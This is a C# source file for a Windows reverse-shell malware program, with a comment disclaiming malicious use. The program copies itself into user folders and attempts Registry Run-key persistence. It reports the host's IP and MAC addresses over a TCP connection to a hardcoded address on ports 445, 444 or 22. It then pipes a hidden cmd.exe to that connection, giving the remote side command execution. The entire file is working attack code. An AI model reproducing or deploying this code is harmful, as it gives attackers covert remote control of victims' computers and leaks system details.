using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks ;
using System.Windows ;
using System.Collections;
using System.ComponentModel;
using System.Security.AccessControl ;
using System.Security ;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Security.Permissions;
using System.Net.Sockets;
using Microsoft.Win32;
namespace Reverse_Shell
{
	public class Program
	{
 	/*
        Good knowledge confers great responsibility
        Don't using this Malware for malicious activity but to learning
        */
   public static string ProcessPath { get; }
    private string Ipadresse ;
    private string Value ;
    private string keyPath ;
    public Program(string Ipadresse,string Value,string keyPath)
    {
      this.Ipadresse = Ipadresse ;
      this.Value = Value ;
      this.keyPath = keyPath ;
    }
        static StreamWriter streamWriter;
        		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception e) {
                    Console.WriteLine(e.ToString());
                 }
            }
        }
		public static void Main(string[] args)
		{
          enregistrement();
          var connexion = new Program("192.168.1.33","HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
          connexion.Connect("192.168.1.33");
          connexion.Registre(@"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                       }
                                  public void Registre(string keyPath,string Value){
          using(RegistryKey subkey = Registry.CurrentUser.CreateSubKey(this.keyPath,true))
           {
            try{
             //string keyValue = "PortNumber";
             Registry.CurrentUser.SetValue(this.Value,subkey);
             Registry.CurrentUser.OpenSubKey(this.Value,RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl);
             RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,RegistryView.Registry64);
           }catch(SecurityException e){
            Console.WriteLine("Security Subkey .............{0}",e);
            subkey.Dispose();
            subkey.Close();
            }catch(ArgumentException e){
            Console.WriteLine("Value not correct ............{0}",e);
            }
        }
                                  }
public static void enregistrement(){
 try{
   string Filepath = Process.GetCurrentProcess().MainModule.FileName; 
  FileInfo sourceFile = new FileInfo(Filepath);
  string Pathdir = "" ;
  DriveInfo[] allDrives = DriveInfo.GetDrives();
  foreach(DriveInfo Drives in allDrives)
  {
    if(Drives.IsReady)
    {
      switch(Drives.Name){
        case @"C:\":
        Pathdir = @"C:\\Users\\users\\Publics" ;
        DirectoryInfo DirectoryPath = new DirectoryInfo(Pathdir);
        Directory.CreateDirectory(Path.Combine(Pathdir,"Malware"));
        sourceFile.CopyTo(Path.Combine(DirectoryPath.FullName,"Malware"));
        FileSecurity fSecurity = File.GetAccessControl(Path.Combine(DirectoryPath.FullName,"Malware",Filepath));
          break ;
          case @"/":
        Pathdir = @"/home/esiounath/Bureau" ;
        DirectoryPath = new DirectoryInfo(Pathdir);
        Directory.CreateDirectory(Path.Combine(Pathdir,"Emplacement"));
        sourceFile.CopyTo(Path.Combine(DirectoryPath.FullName,"Emplacement"));
        fSecurity = File.GetAccessControl(Path.Combine(DirectoryPath.FullName,"Emplacement",Filepath));
        break ;
        case @"E:\":
          break ;
        case @"Z:\":
          break ;
        case @"B:\":
        break ;

      }
    }
  }
 }catch(IOException e)
 {
   Console.WriteLine(e.ToString());
 }
}
           public void Connect(string Ipadresse)
{
  int[] portArray = new int[] {80,22,445,444};
  //var rand = new Random();
   IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
   IPEndPoint [] ipEndPoints = ipProperties.GetActiveTcpListeners();
   foreach(int portA  in portArray)
  {
    //int random = rand.Next(portA);
  
  Console.WriteLine("Port is : {0}",portA);
 
     foreach(IPEndPoint endPoint in ipEndPoints)
     {
         if  (endPoint.Port == portA)
         {
              switch(portA)
    {
      case 445 :
      try
  {
       TcpClient client = new TcpClient(this.Ipadresse,portA);
        if(client.Connected){
    Stream stream = client.GetStream();
    //String strHostName = string.Empty;
    IPHostEntry ipEntry = Dns.GetHostEntry(Dns.GetHostName());
    IPAddress[] addr = ipEntry.AddressList;
    StreamReader streamreader = new StreamReader(stream);
    streamWriter = new StreamWriter(stream);
      StringBuilder stringbuilder = new StringBuilder();
					//ProcessStartInfo processInfo;
					//Process process;
					Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
						process.StartInfo.CreateNoWindow = true;
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.RedirectStandardOutput = true;
						process.StartInfo.RedirectStandardInput = true;
						process.StartInfo.RedirectStandardError = true;
						process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
					  process.Start();
                    process.BeginOutputReadLine();
            streamWriter.WriteLine("The encoding used was {0}.", streamreader.CurrentEncoding);
              for (int i = 0; i < addr.Length; i++)
            {
                streamWriter.WriteLine("IP Address {0} : {1} ", i, addr[i].ToString());
            }
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                  streamWriter.WriteLine("Mac address : {0}",nic.GetPhysicalAddress().ToString());
                }
                  streamWriter.WriteLine("Port used : {0} ",portA);
  	                    while(true)
						{
							stringbuilder.Append(streamreader.ReadLine());
							//stringbuilder.Append("\n");
							process.StandardInput.WriteLine(stringbuilder);
							stringbuilder.Remove(0, stringbuilder.Length);
						}
    }
  }
  catch (ArgumentNullException e)
  {
    Console.WriteLine("ArgumentNullException: {0}", e);
  }
  catch (SocketException e)
  {
    Console.WriteLine("SocketException: {0}", e);
  }
  break ;
  
   case 444 :
      try
  {
        TcpClient client = new TcpClient(this.Ipadresse,portA);
        if(client.Connected){
    Stream stream = client.GetStream();
    StreamReader streamreader = new StreamReader(stream);
    streamWriter = new StreamWriter(stream);
      StringBuilder stringbuilder = new StringBuilder();
					//ProcessStartInfo processInfo;
					//Process process;
					Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
						process.StartInfo.CreateNoWindow = true;
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.RedirectStandardOutput = true;
						process.StartInfo.RedirectStandardInput = true;
						process.StartInfo.RedirectStandardError = true;
						process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
					  process.Start();
                    process.BeginOutputReadLine();
            streamWriter.WriteLine("The encoding used was {0}.", streamreader.CurrentEncoding);

  	                    while(true)
						{
							stringbuilder.Append(streamreader.ReadLine());
							//stringbuilder.Append("\n");
							process.StandardInput.WriteLine(stringbuilder);
							stringbuilder.Remove(0, stringbuilder.Length);
						}
    }
  }
  catch (ArgumentNullException e)
  {
    Console.WriteLine("ArgumentNullException: {0}", e);
  }
  catch (SocketException e)
  {
    Console.WriteLine("SocketException: {0}", e);
  }
  break ;
   case 22 :
      try
  {
        TcpClient client = new TcpClient(this.Ipadresse,portA);
        if(client.Connected){
    Stream stream = client.GetStream();
    StreamReader streamreader = new StreamReader(stream);
    streamWriter = new StreamWriter(stream);
      StringBuilder stringbuilder = new StringBuilder();
					//ProcessStartInfo processInfo;
					//Process process;
					Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
						process.StartInfo.CreateNoWindow = true;
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.RedirectStandardOutput = true;
						process.StartInfo.RedirectStandardInput = true;
						process.StartInfo.RedirectStandardError = true;
						process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
					  process.Start();
                    process.BeginOutputReadLine();
            streamWriter.WriteLine("The encoding used was {0}.", streamreader.CurrentEncoding);

  	                    while(true)
						{
							stringbuilder.Append(streamreader.ReadLine());
							//stringbuilder.Append("\n");
							process.StandardInput.WriteLine(stringbuilder);
							stringbuilder.Remove(0, stringbuilder.Length);
						}
    }
  }
  catch (ArgumentNullException e)
  {
    Console.WriteLine("ArgumentNullException: {0}", e);
  }
  catch (SocketException e)
  {
    Console.WriteLine("SocketException: {0}", e);
  }
  break ;
      
    }

         }
     }
}
  Console.WriteLine("\n Press Enter to continue...");
  Console.Read();
}
}
}
		
